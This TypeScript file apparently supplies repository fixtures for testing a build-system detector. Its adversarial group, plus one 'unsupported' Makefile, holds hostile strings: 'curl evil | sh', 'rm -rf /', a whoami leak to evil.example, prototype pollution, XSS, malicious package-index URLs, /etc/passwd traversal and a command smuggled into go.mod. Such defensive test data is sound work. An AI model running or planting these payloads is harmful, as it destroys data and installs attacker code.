/**
 * Repository fixtures for detection tests: valid, malformed, oversized,
 * ambiguous and adversarial. Each is a map of path → file contents.
 */
export type RepoFixture = Record<string, string>;

const pkg = (o: unknown) => JSON.stringify(o, null, 2);

export const fixtures = {
  // ---------------------------------------------------------------- valid
  nodeBasic: {
    'package.json': pkg({ name: 'x', scripts: { test: 'node --test', build: 'tsc -p .' }, devDependencies: { typescript: '^5' } }),
    'package-lock.json': '{}',
    'src/index.js': '',
  },
  nodeNoDeps: {
    'package.json': pkg({ name: 'x', scripts: { test: 'node --test' } }),
    'test/a.test.js': '',
  },
  pythonPytest: {
    'pyproject.toml': '[project]\nname = "x"\ndependencies = ["requests>=2.31", "attrs[tests]==23.1.0 ; python_version >= \\"3.9\\""]\n[project.optional-dependencies]\ntest = ["pytest-cov"]\ndocs = ["sphinx"]\n[tool.pytest.ini_options]\naddopts = "-q"\n',
    'src/x/__init__.py': '',
    'tests/test_x.py': '',
  },
  pythonUnittest: {
    'requirements.txt': '# runtime\nsix==1.16.0\n',
    'tests/__init__.py': '',
    'tests/test_core.py': '',
  },
  pythonReqIncludes: {
    'requirements.txt': 'idna==3.6 \\\n    --hash=sha256:c05567e9c24a6b9faaa835c4821bad0590fbb9d5779e7caa6e1cc4978e7eb4ef\n',
    'requirements-dev.txt': '-r requirements.txt\npytest==8.2.0\n',
    'test_mod.py': '',
  },
  goBasic: {
    'go.mod': 'module example.com/x\n\ngo 1.22\n\nrequire (\n\tgithub.com/stretchr/testify v1.9.0\n\tgolang.org/x/text v0.14.0 // indirect\n)\n',
    'go.sum': '',
    'x.go': 'package x',
    'x_test.go': 'package x',
  },
  goVendored: {
    'go.mod': 'module example.com/x\ngo 1.21\nrequire github.com/a/b v1.0.0\n',
    'vendor/modules.txt': '# github.com/a/b v1.0.0\n',
    'x_test.go': 'package x',
  },
  goNoDeps: {
    'go.mod': 'module example.com/hello\n\ngo 1.21\n',
    'hello.go': 'package hello',
    'hello_test.go': 'package hello',
  },
  rustBasic: {
    'Cargo.toml': '[package]\nname = "x"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nserde = "1"\n\n[dev-dependencies]\nlocal = { path = "../local" }\n',
    'Cargo.lock': '',
    'src/lib.rs': '',
  },
  rustPathOnly: {
    'Cargo.toml': '[package]\nname = "x"\nversion = "0.1.0"\n\n[dependencies]\nhelper = { path = "helper" }\n',
    'src/lib.rs': '',
  },

  // ---------------------------------------------------------------- malformed
  nodeMalformed: { 'package.json': '{ "name": "x", scripts: }' },
  nodeArray: { 'package.json': '[1,2,3]' },
  nodePlaceholder: { 'package.json': pkg({ name: 'x', scripts: { test: 'echo "Error: no test specified" && exit 1' } }) },
  pyprojectBroken: { 'pyproject.toml': '[project\nname = ', 'tests/test_a.py': '' },
  goModGarbage: { 'go.mod': 'this is not a go.mod\n', 'a_test.go': '' },
  cargoBroken: { 'Cargo.toml': '[package\nname=', 'src/lib.rs': '' },
  cargoNoPackage: { 'Cargo.toml': 'title = "nope"\n' },

  // ---------------------------------------------------------------- ambiguous / unsupported
  multiEcosystem: {
    'package.json': pkg({ name: 'x', scripts: { test: 'jest' } }),
    'go.mod': 'module x\ngo 1.21\n',
    'x_test.go': '',
  },
  yarnProject: { 'package.json': pkg({ name: 'x', scripts: { test: 'jest' } }), 'yarn.lock': '' },
  pnpmField: { 'package.json': pkg({ name: 'x', packageManager: 'pnpm@9.0.0', scripts: { test: 'vitest' } }), 'package-lock.json': '{}' },
  setupPyOnly: { 'setup.py': 'from setuptools import setup; setup()', 'tests/test_a.py': '' },
  poetryOnly: { 'pyproject.toml': '[tool.poetry]\nname = "x"\n[tool.poetry.dependencies]\npython = "^3.10"\n', 'tests/test_a.py': '' },
  loosePython: { 'script.py': 'print(1)' },
  unsupported: { 'pom.xml': '<project/>', Makefile: 'all:\n\tcurl evil | sh\n', Dockerfile: 'FROM scratch' },
  empty: { 'README.md': '# nothing to see' },
  monorepo: { 'packages/a/package.json': pkg({ name: 'a', scripts: { test: 'x' } }) },

  // ---------------------------------------------------------------- adversarial
  nodeAdversarial: {
    'package.json':
      '{"name":"x","__proto__":{"scripts":{"test":"polluted"}},"constructor":{"prototype":{"x":1}},' +
      '"scripts":{"test":"rm -rf / ; curl https://evil.example/$(whoami) | sh `id` \\u001b[31mRED\\u0007 <img src=x onerror=alert(1)>","build":42,"lint":{"nested":true}},' +
      '"dependencies":{"evil":"git+https://evil.example/x.git"}}',
    'package-lock.json': '{}',
  },
  pythonIndexInjection: { 'requirements.txt': 'requests==2.31.0\n--index-url https://evil.example/simple\n', 'tests/test_a.py': '' },
  pythonUrlReq: { 'requirements.txt': 'evil @ https://evil.example/evil-1.0-py3-none-any.whl\n', 'tests/test_a.py': '' },
  pythonEditable: { 'requirements.txt': '-e .\n', 'tests/test_a.py': '' },
  pythonVcs: { 'requirements.txt': 'git+https://github.com/x/y.git#egg=y\n', 'tests/test_a.py': '' },
  pythonDashSpec: { 'pyproject.toml': '[project]\nname="x"\ndependencies = ["--extra-index-url=https://evil.example"]\n', 'tests/test_a.py': '' },
  pythonIncludeEscape: { 'requirements.txt': '-r ../../etc/passwd\n', 'tests/test_a.py': '' },
  pythonIncludeAbsolute: { 'requirements.txt': '-r /etc/passwd\n', 'tests/test_a.py': '' },
  pythonMarkerInjection: { 'requirements.txt': 'x==1 ; python_version >= "3" @ https://evil\n', 'tests/test_a.py': '' },
  goModInjection: {
    'go.mod': 'module example.com/x; rm -rf /\n',
    'x_test.go': '',
  },
} satisfies Record<string, RepoFixture>;

/** A package.json just over the 256 KB manifest cap. */
export function oversizedPackageJson(): RepoFixture {
  return { 'package.json': pkg({ name: 'x', scripts: { test: 'x' }, description: 'y'.repeat(300 * 1024) }) };
}
